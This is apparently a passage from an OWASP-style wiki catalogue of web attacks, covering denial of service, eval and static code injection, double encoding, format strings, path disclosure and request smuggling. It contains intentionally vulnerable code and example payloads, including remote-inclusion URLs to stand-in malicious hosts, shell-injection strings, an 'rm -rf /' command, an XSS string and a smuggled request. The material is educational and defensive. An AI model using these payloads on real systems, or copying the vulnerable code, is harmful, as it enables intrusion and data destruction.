If users can supply, directly or indirectly, a value that will specify how many of an object to create on the application server, and if the server does not enforce a hard upper limit on that value, it is possible to cause the environment to run out of available memory. The server may begin to allocate the required number of objects specified, but if this is an extremely large number, it can cause serious issues on the server, possibly filling its whole available memory and corrupting its performance. 

The following is a simple example of vulnerable code in Java: 

 String TotalObjects = request.getParameter(“numberofobjects”);
 int NumOfObjects = Integer.parseInt(TotalObjects);
 ComplexObject[] anArray = new ComplexObject[NumOfObjects];  // wrong!

===DoS User Input as a Loop Counter===

Similar to the previous problem of User Specified Object Allocation, if the user can directly or indirectly assign a value that will be used as a counter in a loop function, this can cause performance problems on the server. 

The following is an example of vulnerable code in Java: 

 public class MyServlet extends ActionServlet {
    public void doPost(HttpServletRequest request, HttpServletResponse response)
           throws ServletException, IOException {
           . . . 
           String [] values = request.getParameterValues("CheckboxField");
       // Process the data without length check for reasonable range – wrong!
           for ( int i=0; i&lt;values.length; i++) {
                 // lots of logic to process the request
          }
          . . . 
    }
     . . . 
 }

As we can see in this simple example, the user has control over the loop counter. If the code inside the loop is very demanding in terms of resources, and an attacker forces it to be executed a very high number of times, this might decrease the performance of the server in handling other requests, causing a DoS condition. 

===DoS Storing too Much Data in Session===

Care must be taken not to store too much data in a user session object. Storing too much information in the session, such as large quantities of data retrieved from the database,  can cause denial of service issues. This problem is exacerbated if session data is also tracked prior to a login, as a user can launch the attack without the need of an account.

===DoS Locking Customer Accounts===

The first DoS case to consider involves the authentication system of the target application. A common defense to prevent brute-force discovery of user passwords is to lock an account from use after between three to five failed attempts to login. This means that even if a legitimate user were to provide their valid password, they would be unable to login to the system until their account has been unlocked. This defense mechanism can be turned into a DoS attack against an application if there is a way to predict valid login accounts. 

Note, there is a business vs. security balance that must be reached based on the specific circumstances surrounding a given application. There are pros and cons to locking accounts, to customers being able to choose their own account names, to using systems such as CAPTCHA, and the like. Each enterprise will need to balance these risks and benefits, but not all of the details of those decisions are covered here. 

===DoS Failure to Release Resources===

If an error occurs in the application that prevents the release of an in-use resource, it can become unavailable for further use. Possible examples include: 
* An application locks a file for writing, and then an exception occurs but does not explicitly close and unlock the file 
* Memory leaking in languages where the developer is responsible for memory management such as C &amp; C++. In the case where an error causes normal logic flow to be circumvented, the allocated memory may not be removed and may be left in such a state that the garbage collector does not know it should be reclaimed 
* Use of DB connection objects where the objects are not being freed if an exception is thrown. A number of such repeated requests can cause the application to consume all the DB connections, as the code will still hold the open DB object, never releasing the resource. 
The following is an example of vulnerable code in Java. In the example, both the Connection and the CallableStatement should be closed in a finally block. 
 public class AccountDAO {
     … …
     public void createAccount(AccountInfo acct)  
                  throws AcctCreationException {
        … …
            try {
             Connection conn = DAOFactory.getConnection();
             CallableStatement  calStmt = conn.prepareCall(…);
           …  …	
            calStmt.executeUpdate();
            calStmt.close();
           conn.close();
        }  catch (java.sql.SQLException e) {
             throw AcctCreationException (...);
        }
     }
 }

===DoS Buffer Overflows===

Any language where the developer has direct responsibility for managing memory allocation, most notably C &amp; C++, has the potential for a [[Buffer Overflow]]. While the most serious risk related to a buffer overflow is the ability to execute arbitrary code on the server, the first risk comes from the denial of service that can happen if the application crashes. 

The following is a simplified example of vulnerable code in C: 
 void overflow (char *str) {
    char buffer[10];
    strcpy(buffer, str); // Dangerous!
 }
 
 int main () {
   char *str = "This is a string that is larger than the buffer of 10";
   overflow(str);
 }

If this code example were executed, it would cause a segmentation fault and dump core. The reason is that strcpy would try to copy 53 characters into an array of 10 elements only, overwriting adjacent memory locations. While this example above is an extremely simple case, the reality is that in a web based application there may be places where the user input is not adequately checked for its length, making this kind of attack possible.
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Direct Dynamic Code Evaluation ('Eval Injection')</name>
    <description>This attack consists of a script that does not properly validate user inputs in the page parameter.  A remote user can supply a specially crafted URL to pass arbitrary code to an eval() statement, which results in code execution.

Note 1: This attack will execute the code with the same permission like the target web service, including operation system commands.

Note 2: Eval injection is prevalent in handler/dispatch procedures that might want to invoke a large number of functions, or set a large number of variables.</description>
    <environment />
    <example>===Example 1===
In this example an attacker can control all or part of an input string that is fed into an eval() function call

&lt;pre&gt;&lt;nowiki&gt;
  $myvar = "varname"; 
  $x = $_GET['arg']; 
  eval("\$myvar = \$x;"); 
&lt;/nowiki&gt;&lt;/pre&gt;

The argument of "eval" will be processed as PHP, so additional commands can be appended. For example, if "arg" is set to "10 ; system(\"/bin/echo uh-oh\");", additional code is run which executes a program on the server, in this case "/bin/echo".

===Example 2===
The following is an example of [[SQL Injection]]. Consider a web page which has two fields to allow users to enter a Username and a Password. The code behind the page will generate a SQL query to check the Password against the list of Usernames: 
 SELECT UserList.Username
 FROM UserList
 WHERE
 UserList.Username = 'Username'
 AND UserList.Password = 'Password'

If this query returns exactly one row, then access is granted. However, if a malicious user enters a valid Username and injects some valid code ("' OR 1=1") in the Password field, then the resulting query will look like this:
 SELECT UserList.Username
 FROM UserList
 WHERE
 UserList.Username = 'Username'
 AND UserList.Password = 'Password' OR '1'='1'

In the example above, "Password" is assumed to be blank or some innocuous string. "1=1" will always be true and many rows will be returned, thereby allowing access. The final inverted comma will be ignored by the SQL parser. The technique may be refined to allow multiple statements to run, or even to load up and run external programs.

===Example 3===
This is an example of a file that was injected. Consider this PHP program (which includes a file specified by request):

&lt;pre&gt;&lt;nowiki&gt;
&lt;?php
   $color = 'blue';
   if ( isset( $_GET['COLOR'] ) )
      $color = $_GET['COLOR'];
   require( $color . '.php' );
?&gt;
&lt;form&gt;
   &lt;select name="COLOR"&gt;
      &lt;option value="red"&gt;red&lt;/option&gt;
      &lt;option value="blue"&gt;blue&lt;/option&gt;
   &lt;/select&gt;
   &lt;input type="submit"&gt;
&lt;/form&gt;
&lt;/nowiki&gt;&lt;/pre&gt;


The developer thought this would ensure that only blue.php and red.php could be loaded. But as anyone can easily insert arbitrary values in COLOR, it is possible to inject code from files:

* &lt;code&gt;/vulnerable.php?COLOR='''&lt;nowiki&gt;http://evil/exploit&lt;/nowiki&gt;'''&lt;/code&gt; - injects a remotely hosted file containing an exploit.

* &lt;code&gt;/vulnerable.php?COLOR='''C:\ftp\upload\exploit'''&lt;/code&gt; - injects an uploaded file containing an exploit.

* &lt;code&gt;/vulnerable.php?COLOR='''..\..\..\..\ftp\upload\exploit'''&lt;/code&gt; - injects an uploaded file containing an exploit, using [[Path Traversal]].

* &lt;code&gt;/vulnerable.php?COLOR='''C:\notes.txt%00'''&lt;/code&gt; - example using Null character, Meta character to remove the &lt;code&gt;.php&lt;/code&gt; suffix, allowing access to other files than .php. (PHP setting "magic_quotes_gpc = On", which is default, would stop this attack)

===Example 4===
A simple URL which demonstrates a way to do this attack:

  &lt;nowiki&gt;http://some-page/any-dir/index.php?page=&lt;?include($s);?&gt;&amp;s=http://malicious-page/cmd.txt?  &lt;/nowiki&gt;

===Example 5===
Shell Injection applies to most systems which allow software to programmatically execute a Command line. Typical sources of Shell Injection are calls system(), StartProcess(), java.lang.Runtime.exec() and similar APIs.

Consider the following short PHP program, which runs an external program called '''funnytext''' to replace a word the user sent with some other word.

&lt;pre&gt;&lt;nowiki&gt;
&lt;HTML&gt;
&lt;?php
passthru ( " /home/user/phpguru/funnytext " 
           . $_GET['USER_INPUT'] );
?&gt;
&lt;/nowiki&gt;&lt;/pre&gt;

This program can be injected in multiple ways:
* '''`command`''' will execute '''command'''.
* '''$(command)''' will execute '''command'''.
* '''; command''' will execute '''command''', and output result of command.
* '''| command''' will execute '''command''', and output result of command.
* '''&amp;&amp; command''' will execute '''command''', and output result of command.
* '''|| command''' will execute '''command''', and output result of command.
* '''&gt; /home/user/phpguru/.bashrc''' will overwrite file '''.bashrc'''.
* '''&lt; /home/user/phpguru/.bashrc''' will send file '''.bashrc''' as input to '''funnytext'''.

PHP offers [http://www.php.net/manual/en/function.escapeshellarg.php escapeshellarg()] and [http://www.php.net/manual/en/function.escapeshellcmd.php escapeshellcmd()] to perform '''encoding''' before calling methods. However, it is not recommended to trust these methods to be secure - also validate/sanitize input.

===Example 6===
The following code is  vulnerable to eval() injection, because it don’t sanitize the user’s input (in this case: “username”). The program just saves this input in a txt file, and then the server will execute this file without any validation. In this case the user is able to insert a command instead of a username.

Example:
&lt;pre&gt;&lt;nowiki&gt;
&lt;%
	If not isEmpty(Request( "username" ) ) Then
		Const ForReading = 1, ForWriting = 2, ForAppending = 8
		Dim fso, f
		Set fso = CreateObject("Scripting.FileSystemObject")
		Set f = fso.OpenTextFile(Server.MapPath( "userlog.txt" ), ForAppending, True)
		f.Write Request("username") &amp; vbCrLf
		f.close
		Set f = nothing
		Set fso = Nothing
		%&gt;
		&lt;h1&gt;List of logged users:&lt;/h1&gt;
		&amp;lt;pre&amp;gt;
		&lt;%
			Server.Execute( "userlog.txt" )
		%&gt;
		&amp;lt;/pre&amp;gt;
		&lt;%
	Else
		%&gt;
		&lt;form&gt;
			&lt;input name="username" /&gt;&lt;input type="submit" name="submit" /&gt;
		&lt;/form&gt;
		&lt;%
	End If
%&gt;
&lt;/nowiki&gt;&lt;/pre&gt;</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Direct Static Code Injection</name>
    <description>A Direct Static Code Injection attack consists of injecting code directly onto the resource used by application while processing a user request. This is normally performed by tampering libraries and template files which are created based on user input without proper data sanitization. 
Upon a user request to the modified resource, the actions defined in it will be executed at server side in the context of web server process.

[[Server-Side Includes (SSI) Injection | Server Side Includes]] is considered a type of direct static code injection. It should not be confused with other types of code injection, like [[Cross-site Scripting (XSS)| XSS]] (“Cross-site scripting” or “HTML injection”) where the code is executed on the client side.</description>
    <environment />
    <example>===Example 1===
This is a simple example of exploitation of a CGISCRIPT.NET csSearch 2.3 vulnerability, published on Bugtraq ID: 4368.
By requesting the following URL to the server, it’s possible to execute commands defined on the ‘’’’setup’’’ variable.
&lt;br&gt;
 csSearch.cgi?command=savesetup&amp;setup=''PERL_CODE_HERE''
&lt;br&gt;
For the classic example, the following command can be used to remove all files from “/” folder:
csSearch.cgi?command=savesetup&amp;setup=`rm%20-rf%20/`

Note that the above command must be encoded in order to be accepted.

===Example 2===
This example exploits a vulnerability on Ultimate PHP Board (UPB) 1.9 (CVE-2003-0395), which allows an attacker to execute random php code. This happens because some user variables, like IP address and User-Agent, are stored in a file that is used by the admin_iplog.php page to show user statistics. When an administrator browses this page, the previously injected code by a malicious request is executed. 
The following example stores a malicious PHP code that will deface the index.html page when an administrator browses admin_iplog.php.
 GET /board/index.php HTTP/1.0
 User-Agent: &lt;? system( "echo \'hacked\' &gt; ../index.html" ); ?&gt;</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Double Encoding</name>
    <description>This attack technique consists of encoding user request parameters twice in hexadecimal format in order to bypass security controls or cause unexpected behavior from the application. It's possible because the webserver accepts and processes client requests in many encoded forms.

By using double encoding it’s possible to bypass security filters that only decode user input once. The second decoding process is executed by the backend platform or modules that properly handle encoded data, but don't have the corresponding security checks in place.
 
Attackers can inject double encoding in pathnames or query strings to bypass the authentication schema and security filters in use by the web application.

There are some common characters sets that are used in Web applications attacks. For example, [[Path Traversal]] attacks  use “../” (dot-dot-slash) , while [[Cross-site Scripting (XSS)|XSS]] attacks use “&lt;” and “&gt;” characters. These characters give a hexadecimal representation that differs from normal data. 

For example, “../” (dot-dot-slash) characters represent %2E%2E%2f in hexadecimal representation. When the % symbol is encoded again, its representation in hexadecimal code is %25. The result from the double encoding process ”../”(dot-dot-slash) would be %252E%252E%252F:
 
* The hexadecimal encoding of “../” represents "%2E%2E%2f"

* Then encoding the “%” represents "%25"

* Double encoding of “../” represents "%252E%252E%252F"</description>
    <environment />
    <example>===Example 1 ===
This example presents an old well-known vulnerability found in IIS versions 4.0 and 5.0, where an attacker could bypass an authorization schema and gain access to any file on the same drive as the web root directory due to an issue with the decoding mechanism. For more details about folder traversal vulnerability, see [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0333  CVE 2001-0333]. 

In this scenario, the victim has a published executable directory (e.g. cgi) that’s stored on the same partition as the Windows system folder. An attacker could execute arbitrary commands on the web server by submitting the following URL: 

Original URL:

 &lt;nowiki&gt;http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\&lt;/nowiki&gt;

However, the application uses a security check filter that refuses requests containing characters like “../”. By double encoding the URL, it’s possible to bypass security the filter:

Double encoded URL:

 &lt;nowiki&gt;http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\ &lt;/nowiki&gt;

===Example 2 ===
A double encoded URL can be used to perform an XSS attack in order to bypass a built-in XSS detection module. Depending on the implementation, the first decoding process is performed by HTTP protocol and the resultant encoded URL will bypass the XSS filter, since it has no mechanisms to improve detection. A simple example XSS would be:

 &lt;script&gt;alert('XSS')&lt;/script&gt;

This malicious code could be inserted into a vulnerable application,  resulting in an alert window with the message “XSS”. However, the web application can have a character filter which prohibits characters such as “&lt; “, “&gt;” and “/”, since they are used to perform web application attacks. The attacker could use a double encoding technique to bypass the filter and exploit the client’s session. The encoding process for this Java script is:

&lt;table &gt;

&lt;tr&gt;
&lt;td colspan=30&gt;&lt;b&gt; Char &lt;/b&gt;&lt;/td&gt;
&lt;td colspan=40&gt;&lt;b&gt; Hex encode &lt;/b&gt;&lt;/td&gt;
&lt;td colspan=50%&gt;&lt;b&gt; Then encoding '%' &lt;/b&gt;&lt;/td&gt;
&lt;td colspan=50%&gt;&lt;b&gt; Double encode &lt;/b&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td colspan=30&gt; “&lt;” &lt;/td&gt;
&lt;td colspan=40&gt; “%3C” &lt;/td&gt;
&lt;td colspan=50%&gt; “%25” &lt;/td&gt;
&lt;td colspan=50%&gt; “%253C” &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td colspan=30&gt; “/” &lt;/td&gt;
&lt;td colspan=40&gt; “%2F” &lt;/td&gt;
&lt;td colspan=50%&gt; “%25”  &lt;/td&gt;
&lt;td colspan=50%&gt; “%252F” &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td colspan=30&gt; “&gt;” &lt;/td&gt;
&lt;td colspan=40&gt; “%3E” &lt;/td&gt;
&lt;td colspan=50%&gt; “%25”  &lt;/td&gt;
&lt;td colspan=50%&gt; “%253E” &lt;/td&gt;
&lt;/tr&gt;

&lt;/table&gt;

Finally, the malicious double encoding code is:

 %253Cscript%253Ealert('XSS')%253C%252Fscript%253E
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Execution After Redirect (EAR)</name>
    <description>Execution After Redirect (EAR) is an attack where an attacker ignores redirects and retrieves sensitive content intended for authenticated users. A successful EAR exploit can lead to complete compromise of the application.
</description>
    <environment />
    <example />
    <determination>Using most proxies it is possible to ignore redirects and display what is returned. In this test we use Burp Proxy.&lt;br&gt;
# Intercept request https://vulnerablehost.com/managment_console
# Send to repeater.
# View response.</determination>
    <protection>Proper termination should be performed after redirects. In a function a return should be performed. In other instances functions such as die() should be performed. This will tell the application to terminate regardless of if the page is redirected or not.</protection>
  </vul>
  <vul>
    <name>Forced browsing</name>
    <description>Forced browsing is an attack where the aim is to enumerate and access resources that are not referenced by the application, but are still accessible.

An attacker can use [[Brute force attack|Brute Force]] techniques to search for unlinked contents in the domain directory, such as temporary directories and files, and old backup and configuration files. These resources may store sensitive information about web applications and operational systems, such as source code, credentials, internal network addressing, and so on, thus being considered a valuable resource for intruders.
 
This attack is performed manually when the application index directories and pages are based on number generation or predictable values,  or using automated  tools for common files and directory names.

This attack is also known as Predictable Resource Location, File Enumeration, Directory Enumeration, and Resource Enumeration.

&lt;!--==Risk Factors==
TBD--&gt;
[[Category:FIXME|need content]]
</description>
    <environment />
    <example>===Example 1===
This example presents a technique of Predictable Resource Location attack, which is based on a manual and oriented identification of resources by modifying URL parameters. 
The user1 wants to check his on-line agenda through the following URL: 

 &lt;nowiki&gt; www.site-example.com/users/calendar.php/user1/20070715 &lt;/nowiki&gt;

In the URL, it is possible to identify the username (âuser1â) and the date (mm/dd/yyyy). If the user attempts to make a forced browsing attack, he could guess another userâs agenda by predicting user identification and date, as follow: 

 &lt;nowiki&gt; www.site-example.com/users/calendar.php/user6/20070716 &lt;/nowiki&gt;

The attack can be considered successful upon accessing other user's agenda. A bad implementation of the authorization mechanism contributed to this attack's success.

===Example 2 ===
This example presents  an attack of static directory and file enumeration using an automated tool.

A scanning tool, like [http://www.cirt.net/code/nikto.shtml Nikto], has the ability to search for existing files and directories based on a database of well-know resources, such as:

 /system/
 /password/
 /logs/
 /admin/
 /test/

When the tool receives an âHTTP 200â message it means that such resource was found and should be manually inspected for valuable information.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Format string attack</name>
    <description>The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system.
   
To understand the attack, it’s necessary to understand the components that constitute it. 

•The '''Format Function''' is an ANSI C conversion function, like '''printf, fprintf''', which converts a primitive variable of the programming language into a human-readable string representation. 

•The '''Format String''' is the argument of the Format Function and is an ASCII Z string which contains text and format parameters, like: '''printf ("The magic number is: %d\n", 1911)''';

•The '''Format String Parameter''', like '''%x %s''' defines the type of conversion of the format function.

The attack could be executed when the application doesn’t properly validate the submitted input. In this case, if a Format String parameter, like %x, is inserted into the posted data,  the string is parsed by the Format Function, and the conversion specified in the parameters is executed.   However, the Format Function is expecting more arguments as input, and if these arguments are not supplied, the function could read or write the stack.

In this way, it is possible to define a well-crafted input that could change the behavior of the format function, permitting the attacker to cause denial of service or to execute arbitrary commands.

If the application uses Format Functions in the source-code, which is able to interpret formatting characters, the attacker could explore the vulnerability by inserting formatting characters in a form of the website. For example, if the '''printf''' function is used to print the username inserted in some fields of the page, the website could be vulnerable to this kind of attack, as showed below:

 printf (userName);

Following are some examples  of Format Functions, which if not  treated, can expose the application to the Format String Attack.


'''Table 1. Format Functions'''

{|border="1" cellpadding="20" cellspacing="0"
!Format function
!Description
|-
|fprint
|Writes the printf to a file
|-
|printf
|Output a formatted string
|-
|sprintf
|Prints into a string
|-
|snprintf
|Prints into a string checking the length
|-
|vfprintf
|Prints the a va_arg structure to a file
|-
|vprintf
|Prints the va_arg structure to stdout
|-
|vsprintf
|Prints the va_arg to a string
|-
|vsnprintf
|Prints the va_arg to a string checking the length
|}


Below are some format parameters which can be used and their consequences:

•"%x" Read data from the stack

•"%s" Read character strings from the process' memory

•"%n" Write an integer to locations in the process' memory


To discover whether  the application is vulnerable to this type of attack, it's necessary to verify if the format function accepts and parses the format string parameters shown in table 2.


'''Table 2. Common parameters used in a Format String Attack.'''

{|border="1" cellpadding="20" cellspacing="0"
!Parameters
!Output
!Passed as
|-
|%%
|% character (literal)
|Reference
|-
|%p
|External representation of a pointer to void
|Reference
|-
|%d
|Decimal
|Value
|-
|%c
|Character
|
|-
|%u
|Unsigned decimal
|Value
|-
|%x
|Hexadecimal
|Value
|-
|%s
|String
|Reference
|-
|%n
|Writes the number of characters into a pointer
|Reference
|}
</description>
    <environment />
    <example>===Example1===
This example demonstrates how the application can behave when the format function does not receive the necessary treatments for validation in the input of format string.

First is the application operating with normal behavior and normal inputs, then, the application operating when the attacker inputs the format string and the resulting behavior.

Below is the source-code used for the example. 
 #include  &lt;stdio.h&gt;
 #include  &lt;string.h&gt;
 #include  &lt;stlib.h&gt;
 
 int main (int argc, char **argv)
 {
 	char buf [100]
 	int x = 1
 	snprintf ( buf, sizeof buf, argv [1] ) ;
 	buf [ sizeof buf -1 ] = 0
 	printf ( “Buffer size is: (%d) \nData input: %s \n” , strlen (buf) , buf ) ;
 	printf ( “X equals: %d/ in hex: %#x\nMemory address for x: (%p) \n” , x, x, &amp;x) ;
 	return 0 ;
 }


Next is the output that the program supplies when running with expected inputs. In this case the program received the string “Bob” as input and returned it in the output.

 ./formattest “Bob”

 Buffer size is (16)
 Data input : Bob
 X equals: 1/ in hex: 0x1
 Memory address for x (0xbffff73c)

Now  the format string vulnerability will be explored. If the format string parameter “%x %x” is inserted in the input string, when the format function parses the argument, the output will display the name Bob, but instead of showing the %x string, the application will show the contents of a memory address.

 ./formattest “Bob %x %x”

 Buffer size is (27)
 Data input : Bob bffff 8740
 X equals: 1/ in hex: 0x1
 Memory address for x (0xbffff73c)

The inputs Bob and the format strings parameters will be attributed to the variable buf inside the code which should take the place of the %s in the Data input. So now the printf argument looks like:

 printf ( “Buffer size is: (%d) \n Data input: Bob %x %x \n” , strlen (buf) , buf ) ;

When the application prints the results, the format function will interpret the format string inputs, showing the content of a memory address.

===Example 2===
'''Denial of Service'''

In this case,  when an invalid memory address is requested, normally the program is terminated.

 printf (userName);

The attacker could insert a sequence of format strings, making the program show the memory address where a lot of other data are stored, then, the attacker increases the possibility that the program will read an illegal address, crashing the program and  causing its non-availability.

 printf (%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s);</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Full Path Disclosure</name>
    <description>Full Path Disclosure (FPD) vulnerabilities enable the attacker to see the path to the webroot/file.  e.g.: /home/omg/htdocs/file/. 
Certain vulnerabilities, such as using the load_file() (within a [[SQL Injection]]) query to view the page source, require the attacker to have the full path to the file they wish to view.

The risks regarding FPD may produce various outcomes. For example, if the webroot is getting leaked, attackers may abuse the knowledge and use it in combination with file inclusion vulnerabilites (see [https://www.owasp.org/index.php/PHP_File_Inclusion PHP File Inclusion]) to steal configuration files regarding the web application or the rest of the operating system.
&lt;pre&gt;
Warning: session_start() [function.session-start]: The session id contains illegal characters, 
valid characters are a-z, A-Z, 0-9 and '-,' in /home/example/public_html/includes/functions.php on line 2
&lt;/pre&gt;

In combination with, say, unproteced use of the PHP function file_get_contents, the attacker gets an opportunity to steal configuration files.

'''The sourcecode of index.php:'''
&lt;pre&gt;
&lt;?php
   echo file_get_contents(getcwd().$_GET['page']);
?&gt;
&lt;/pre&gt;

An attacker crafts a URL like so: [http://site.com/index.php?page=../../../../../../../home/example/public_html/includes/config.php http://site.com/index.php?page=../../../../../../../home/example/public_html/includes/config.php] with the knowledge of the FPD in combination with [https://www.owasp.org/index.php/Relative_Path_Traversal Relative Path Traversal].

'''The leaked sourcecode of config.php:'''
&lt;pre&gt;
&lt;?php
   //Hidden configuration file containing database credentials.
   $hostname = 'localhost';
   $username = 'root';
   $password = 'owasp_fpd';
   $database = 'example_site';
   $connector = mysql_connect($hostname, $username, $password);
   mysql_select_db($database, $connector);
?&gt;
&lt;/pre&gt;
Disregarding the above sample, FPD can also be used to reveal the underlaying operation system by observing the file paths.
Windows for instance always start with a drive-letter, e.g; C:\, while Unix based operating system tend to start with a single front slash.

'''*NIX:'''
&lt;pre&gt;
Warning: session_start() [function.session-start]: The session id contains illegal characters, 
valid characters are a-z, A-Z, 0-9 and '-,' in /home/alice/public_html/includes/functions.php on line 2
&lt;/pre&gt;

'''Microsoft Windows:'''
&lt;pre&gt;
Warning: session_start() [function.session-start]: The session id contains illegal characters, 
valid characters are a-z, A-Z, 0-9 and '-,' in C:\Users\bob\public_html\includes\functions.php on line 2
&lt;/pre&gt;

The FPD may reveal a lot more than people normally might suspect. The two examples above reveal usernames on the operating systems as well; "'''alice'''" and "'''bob'''".
Usernames are of course important pieces of credentials. Attackers can use those in many different ways, ranging all from bruteforcing over various protocols (SSH, Telnet, RDP, FTP...) to launching exploits requiring working usernames.</description>
    <environment />
    <example>'''Empty Array'''

If we have a site that uses a method of requesting a page like this:
&lt;pre&gt;http://site.com/index.php?page=about&lt;/pre&gt;
We can use a method of opening and closing braces that causes the page to output an error.  This method would look like this:
&lt;pre&gt;http://site.com/index.php?page[]=about&lt;/pre&gt;
This renders the page defunct thus spitting out an error:
&lt;pre&gt;Warning: opendir(Array): failed to open dir: No such file or directory in /home/omg/htdocs/index.php on line 84
Warning: pg_num_rows(): supplied argument ... in /usr/home/example/html/pie/index.php on line 131&lt;/pre&gt;

'''Null Session Cookie'''

Another popular and very reliable method of producing errors containing a FPD is to give the page a nulled session using JavaScript Injections.
A simple injection using this method would look something like so:
&lt;pre&gt;javascript:void(document.cookie="PHPSESSID=");&lt;/pre&gt;
By simply setting the PHPSESSID cookie to nothing (null) we get an error.
&lt;pre&gt;Warning: session_start() [function.session-start]: The session id contains illegal characters, 
valid characters are a-z, A-Z, 0-9 and '-,' in /home/example/public_html/includes/functions.php on line 2&lt;/pre&gt;

This vulnerability is prevented simply by turning error reporting off so your code does not spit out errors.
&lt;pre&gt;error_reporting(0);&lt;/pre&gt;
Errors can contain useful information for site owner so instead of disabling the error reporting at all, it is possible to only hide errors from output by [http://www.php.net/errorfunc.configuration#ini.display-errors display_errors].

'''Invalid Session Cookie'''

As a complement to the Null Session Cookie, a very long session could also produce an error containing FPD.
This could also be accomplished using a JavaScript injection like so:
&lt;pre&gt;javascript:void(document.cookie='PHPSESSID=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');&lt;/pre&gt;
By simply setting the PHPSESSID cookie to 129 bytes or more, PHP may spit out a warning.

Another approach would be to to set the PHPSESSID cookie data to one of the reserved bytes.
&lt;pre&gt;javascript:void(document.cookie='PHPSESSID=.');&lt;/pre&gt;

Both variants result in the following.
&lt;pre&gt;Warning: session_start(): The session id is too long or contains illegal characters,
valid characters are a-z, A-Z, 0-9 and '-,' in /home/example/public_html/includes/functions.php on line 2&lt;/pre&gt;

The same remedy as for Null Session Cookie may be applied here.
Errors may be hidden from the output by [http://www.php.net/errorfunc.configuration#ini.display-errors display_errors].

'''Direct Access to files that requires preloaded library files'''

Web application developers sometimes fail to add safe checks in files that requires preloaded library/function files.
This is prone to reveal possible sensitive information when those applications' URLs are directly requested. Sometimes, it's a clue to Local File Inclusion vulnerability.  

Concerning with Mambo CMS, if we access to a direct url, http://site.com/mambo/mambots/editors/mostlyce/jscripts/tiny_mce/plugins/spellchecker/classes/PSpellShell.php, then we gets 

&lt;pre&gt;
&lt;br /&gt;
&lt;b&gt;Fatal error&lt;/b&gt;:  Class 'SpellChecker' not found in &lt;b&gt;/home/victim/public_html/mambo/mambots/editors/mostlyce/jscripts/tiny_mce/plugins/spellchecker/classes/PSpellShell.php&lt;/b&gt; on line &lt;b&gt;9&lt;/b&gt;&lt;br /&gt;
&lt;/pre&gt;
</example>
    <determination>The above three checks can be done with the aid of [https://code.google.com/p/inspathx/ inspathx] tool.</determination>
    <protection />
  </vul>
  <vul>
    <name>HTTP Request Smuggling</name>
    <description>The HTTP Request Smuggling attack explores an incomplete parsing of the submitted data done by an intermediary HTTP system working as a proxy. HTTP Request Smuggling consists of sending a specially formatted HTTP request that will be parsed in a different way by the proxy system and by the final system, so the attacker could smuggle a request to one system without the other being aware of it. This attack makes it possible to exploit other attacks, like [[Cache Poisoning]], [[Session hijacking attack|Session Hijacking]], [[Cross-site Scripting (XSS)]] and most importantly, the ability to bypass web application firewall protection. 

To exploit the HTTP Request Smuggling,  some specific conditions must exist,  such as the presence of specific proxy system and version such as SunOne Proxy 3.6 (SP4) or FW-1/FP4-R55W beta or an XSS vulnerability in the web server.

Basically the attack consists of submitting an HTTP request that encapsulates a second HTTP request in the same header, as shown below.

 GET /some_page.jsp?param1=value1&amp;param2=
 Content-Type: application/x-www-form-
 Content-Length: 0
 Foobar: GET /mypage.jsp HTTP/1.0
 Cookie: my_id=1234567
 Authorization: Basic ugwerwguwygruwy

In this case, the first HTTP header is parsed by the proxy system and the second by the final system, permitting the attacker to bypass the proxy’s access control.


The attack could be exploited in different ways as reported by “HTTP Request Smuggling” paper by Watchfire, so it’s possible to realize these attacks:

• Web Cache Poisoning

• Firewall/IPS/IDS evasion

• Forward vs. backward HRS

• Request Hijacking

• Request Credential Hijacking</description>
    <environment />
    <example>===Example 1 - Cache Poisoning Exploiting ===

Our first example demonstrates a classic HRS attack. Suppose a POST request contains two "Content-Length" headers with conflicting values. Some servers (e.g., IIS and Apache) reject such a request, but it turns out that others choose to ignore the problematic header. Which of the two headers is the problematic one? Fortunately for the attacker, different servers choose different answers. For example, SunONE W/S 6.1 (SP1) uses the first "Content-Length" header, while SunONE Proxy 3.6 (SP4) takes the second header (notice that both applications are from the SunONE family). Let SITE be the DNS name of the SunONE W/S behind the SunONE Proxy. Suppose that "/poison.html" is a static (cacheable) HTML page on the W/S. Here's the HRS attack that exploits the inconsistency between the two servers:

 &lt;Font Color="blue"&gt;1 POST &lt;nowiki&gt;http://SITE/foobar.html&lt;/nowiki&gt; HTTP/1.1
 2 Host: SITE
 3 Connection: Keep-Alive
 4 Content-Type: application/x-www-form-urlencoded
 5 Content-Length: 0
 6 Content-Length: 44
 7 [CRLF] &lt;/Font Color&gt;
 &lt;Font Color="purple"&gt;8 GET /poison.html HTTP/1.1
 9 Host: SITE
 10 Bla: [space after the "Bla:", but no CRLF]&lt;/Font Color&gt;
 &lt;Font Color="red"&gt;11 GET &lt;nowiki&gt;http://SITE/page_to_poison.html&lt;/nowiki&gt; HTTP/1.1
 12 Host: SITE
 13 Connection: Keep-Alive
 14 [CRLF]&lt;/Font Color&gt;

[Note that each line terminates with a CRLF ("\r\n"), except for line 10.]
